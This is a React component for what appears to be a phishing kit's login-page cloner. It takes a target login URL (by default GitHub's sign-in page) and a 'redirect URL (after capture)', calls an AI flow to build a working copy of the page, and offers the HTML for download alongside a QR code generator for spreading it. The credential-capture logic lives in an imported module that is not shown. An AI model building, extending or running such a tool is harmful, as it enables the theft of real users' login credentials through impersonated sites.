'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot } from 'lucide-react';
import { cloneLoginPage, type PageClonerOutput } from '@/ai/flows/page-cloner-flow';
import { useToast } from '@/hooks/use-toast';
import { QrCodeGenerator } from './qr-code-generator';

const pageClonerSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL to clone.' }),
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
});

export function LoginPageCloner() {
  const { toast } = useToast();
  const [clonerResult, setClonerResult] = useState<PageClonerOutput | null>(null);
  const [isClonerLoading, setIsClonerLoading] = useState(false);
  const [clonerError, setClonerError] = useState<string | null>(null);

  const form = useForm<z.infer<typeof pageClonerSchema>>({
    resolver: zodResolver(pageClonerSchema),
    defaultValues: {
      targetUrl: 'https://github.com/login',
      redirectUrl: 'https://github.com/password_reset',
    },
  });

  async function onClonerSubmit(values: z.infer<typeof pageClonerSchema>) {
    setIsClonerLoading(true);
    setClonerResult(null);
    setClonerError(null);
    try {
      const response = await cloneLoginPage(values);
      setClonerResult(response);
      toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
      setClonerError(errorMessage);
      console.error(err);
    } finally {
      setIsClonerLoading(false);
    }
  }

  const handleDownloadHtml = () => {
    if (clonerResult?.htmlContent) {
      const blob = new Blob([clonerResult.htmlContent], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'cloned_login.html';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
    }
  }

  return (
    <div className="grid lg:grid-cols-5 gap-6">
      <div className="lg:col-span-2 space-y-6">
        <Card>
          <CardHeader>
            <CardTitle>Page Cloner</CardTitle>
            <CardDescription>Create a functional, static clone of any login page.</CardDescription>
          </CardHeader>
          <CardContent>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
                <FormField control={form.control} name="targetUrl" render={({ field }) => ( <FormItem> <FormLabel>Target URL to Clone</FormLabel> <FormControl><Input placeholder="https://example.com/login" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                <Button type="submit" disabled={isClonerLoading} className="w-full">
                  {isClonerLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <RefreshCw className="mr-2 h-4 w-4" />}
                  Clone Page
                </Button>
              </form>
            </Form>
          </CardContent>
        </Card>
        {clonerResult && <QrCodeGenerator />}
      </div>
      <div className="lg:col-span-3">
        {clonerError && <Card className="border-destructive/50 mb-4"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Cloning Failed</CardTitle></div></CardHeader><CardContent><p>{clonerError}</p></CardContent></Card>}
        <Card className={`min-h-[400px] ${!clonerResult && 'flex items-center justify-center'}`}>
          <CardHeader className="w-full flex flex-row items-center justify-between">
            <div className="flex items-center gap-3"><LinkIcon className="h-6 w-6" /><CardTitle>Cloned Page Preview</CardTitle></div>
            {clonerResult && (
              <Button variant="outline" size="sm" onClick={handleDownloadHtml}>
                <Download className="mr-2 h-4 w-4"/> Download HTML
              </Button>
            )}
          </CardHeader>
          <CardContent className="w-full">
            {isClonerLoading && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
            {!clonerResult && !isClonerLoading && (
                <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                    <Bot className="h-12 w-12 mb-4" />
                    <p>Cloned page preview will appear here.</p>
                </div>
            )}
            {clonerResult && (<div className="border rounded-md w-full h-[70vh] bg-background"><iframe srcDoc={clonerResult.htmlContent} className="w-full h-full" title="Cloned Page Preview" sandbox="allow-forms allow-scripts allow-same-origin"/></div>)}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
